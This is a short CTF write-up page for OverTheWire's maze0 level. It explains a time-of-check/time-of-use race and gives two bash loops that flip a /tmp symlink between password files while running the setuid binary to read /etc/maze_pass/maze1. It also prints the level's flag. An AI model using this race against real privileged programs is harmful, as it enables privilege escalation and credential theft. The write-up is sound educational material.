<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>maze0 | Avishai’s CTF Writeups</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="maze0" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="…" />
<meta property="og:description" content="…" />
<link rel="canonical" href="http://localhost:4000/CTF_writeups/overthewire/maze/maze0.html" />
<meta property="og:url" content="http://localhost:4000/CTF_writeups/overthewire/maze/maze0.html" />
<meta property="og:site_name" content="Avishai’s CTF Writeups" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="maze0" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"maze0","url":"http://localhost:4000/CTF_writeups/overthewire/maze/maze0.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/CTF_writeups/">
          <h1>Avishai's CTF Writeups</h1>
        </a>
        <h2>...</h2>

        <section id="downloads">
          
          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <p>in this level we exploit race condition.
first it checks access to a file, and then change to higher privileges and print the content of the file. 
so, we will link it to maze0 privilege, and before it opens the file for reading, we’ll change to maze1 privilege.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="k">while</span> <span class="o">[</span> <span class="nb">true</span> <span class="o">]</span><span class="p">;</span> <span class="k">do
        </span><span class="nb">ln</span> <span class="nt">-sf</span> /etc/maze_pass/maze0 /tmp/128ecf542a35ac5270a87dc740918404
        <span class="nb">ln</span> <span class="nt">-sf</span> /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404
<span class="k">done</span><span class="p">;</span>

</code></pre></div></div>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="k">while</span> <span class="o">[</span> <span class="nb">true</span> <span class="o">]</span><span class="p">;</span> <span class="k">do</span>
        /maze/maze0
        <span class="nb">cat</span> /tmp/128ecf542a35ac5270a87dc740918404 2&gt; /dev/null
<span class="k">done</span><span class="p">;</span>

</code></pre></div></div>

<p>then, we’ll run this</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./link_script.sh &amp;
./run_script.sh | grep -av "maze0"
</code></pre></div></div>

<p><img src="/CTF_writeups/overthewire/maze/images/level1.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">kfL7RRfpkY</code></em></strong></p>

      </section>
    </div>
  </body>
</html>
